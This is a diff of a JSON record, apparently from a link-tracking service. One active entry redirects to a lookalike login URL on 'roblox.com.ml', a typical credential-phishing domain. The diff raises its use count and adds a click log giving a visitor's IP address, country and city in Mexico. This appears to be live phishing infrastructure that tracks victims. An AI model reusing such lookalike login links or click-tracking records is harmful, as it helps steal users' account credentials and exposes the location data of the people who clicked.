@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 482,
+    "useCount": 483,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3963,6 +3963,14 @@
       },
       {
         "timestamp": 1777079716562,
+        "ip": "187.131.254.4",
+        "country": "Mexico",
+        "city": "Tultitlán de Mariano Escobedo",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777079748340,
         "ip": "187.131.254.4",
         "country": "Mexico",
         "city": "Tultitlán de Mariano Escobedo",
